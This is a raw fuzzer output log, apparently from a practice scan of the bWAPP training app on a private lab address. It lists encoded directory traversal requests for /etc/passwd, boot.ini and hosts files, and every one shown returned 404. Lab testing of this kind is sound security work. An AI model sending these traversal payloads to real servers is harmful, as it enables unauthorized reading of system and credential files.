7607,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cboot.ini
7605,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cetc%c1%1cpasswd
7606,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cetc%c1%1cissue
7596,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1c..../%c1%1c..../%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
7609,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%afetc%c1%afpasswd
7587,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1cboot.ini
7610,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%afetc%c1%afissue
7611,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%afboot.ini
7602,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cetc%c1%1cissue
7613,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%afetc%c1%afpasswd
7612,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
7615,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%afboot.ini
7614,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%afetc%c1%afissue
7616,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
7617,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%afetc%c1%afpasswd
7621,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%afetc%c1%afpasswd
7620,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
7622,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%afetc%c1%afissue
7627,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afboot.ini
7624,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
7623,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%afboot.ini
7619,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%afboot.ini
7625,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afetc%c1%afpasswd
7618,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%afetc%c1%afissue
7626,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afetc%c1%afissue
7628,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
7630,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afetc%c1%afissue
7631,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afboot.ini
7801,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%afetc%e0%80%afpasswd
7803,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%afboot.ini
7805,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%afetc%e0%80%afpasswd
7802,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%afetc%e0%80%afissue
7813,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afpasswd
7807,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%afboot.ini
7806,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%afetc%e0%80%afissue
7815,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afboot.ini
7814,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afissue
7808,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
7819,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afboot.ini
7816,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
7817,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afpasswd
7812,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
7811,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%afboot.ini
7820,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
7809,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afpasswd
7822,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afissue
7824,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
7823,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afboot.ini
7826,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259cetc%25c1%259cissue
7821,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afpasswd
7804,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
7810,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afissue
7827,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259cboot.ini
7828,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
7830,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259cetc%25c1%259cissue
7831,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259cboot.ini
7833,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cpasswd
7832,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
7829,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259cetc%25c1%259cpasswd
7818,404,9L,39W,http://10.0.2.4/bWAPP/..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%af..../%e0%80%afetc%e0%80%afissue
7837,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cpasswd
7839,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cboot.ini
7838,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cissue
7835,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259cboot.ini
7840,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
7842,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cissue
7841,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cpasswd
7845,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cpasswd
7844,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
7843,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cboot.ini
7848,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
7825,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259cetc%25c1%259cpasswd
7834,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cissue
7846,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cetc%25c1%259cissue
7849,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25afetc%25c0%25afpasswd
7850,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25afetc%25c0%25afissue
7853,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25afetc%25c0%25afpasswd
7851,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25afboot.ini
7857,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afpasswd
7854,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25afetc%25c0%25afissue
7847,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259c..../%25c1%259cboot.ini
7856,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
7836,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c1%259c..../%25c1%259c..../%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
7860,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
7858,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afissue
7861,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afpasswd
7862,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afissue
7859,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25afboot.ini
7863,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afboot.ini
7865,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afpasswd
7866,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afissue
7864,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
7867,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afboot.ini
7868,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
7869,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afpasswd
7870,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afetc%25c0%25afissue
7872,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
7874,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%afetc%f0%80%80%afissue
7871,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25af..../%25c0%25afboot.ini
7855,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25af..../%25c0%25afboot.ini
7876,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
7877,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afpasswd
7875,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%afboot.ini
7873,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%afetc%f0%80%80%afpasswd
7878,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afissue
7880,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
7879,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%afboot.ini
7881,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afpasswd
7882,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afissue
7883,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afboot.ini
7884,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
7886,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afissue
7885,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afpasswd
7888,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
7887,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afboot.ini
7889,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afpasswd
7890,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afissue
7891,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afboot.ini
7892,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
7893,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afpasswd
7894,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afetc%f0%80%80%afissue
7898,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%afetc%f8%80%80%80%afissue
7895,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afboot.ini
7852,404,9L,39W,http://10.0.2.4/bWAPP/..../%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
7900,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
7897,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
7902,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afissue
7901,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
7904,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
7896,404,9L,39W,http://10.0.2.4/bWAPP/..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%af..../%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts
7899,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%afboot.ini
7906,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afissue
7903,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%afboot.ini
7910,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afissue
7911,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afboot.ini
7909,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
7908,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
7912,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
7913,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
7914,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afissue
7905,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
7915,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afboot.ini
7918,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afissue
7917,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
7916,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
7920,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
7919,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afboot.ini
7921,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e/etc/passwd
7924,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e/windows/system32/drivers/etc/hosts
7922,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e/etc/issue
7923,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e/boot.ini
7907,404,9L,39W,http://10.0.2.4/bWAPP/..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afboot.ini
7945,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\etc\passwd
7946,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\etc\issue
7947,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\boot.ini
7951,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\boot.ini
7953,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\etc\passwd
7950,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\etc\issue
7952,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
7954,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\etc\issue
7959,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini
7948,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\windows\system32\drivers\etc\hosts
7960,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
7955,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\boot.ini
7964,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
7956,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
7958,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\issue
7963,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini
7961,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\passwd
7970,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2fetc%2fissue
7966,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\issue
7962,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\issue
7968,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts
7969,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2fetc%2fpasswd
7971,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2fboot.ini
7967,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini
7965,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\passwd
7972,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
7974,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2fetc%2fissue
7973,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2fetc%2fpasswd
7957,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc\passwd
7975,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2fboot.ini
7977,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
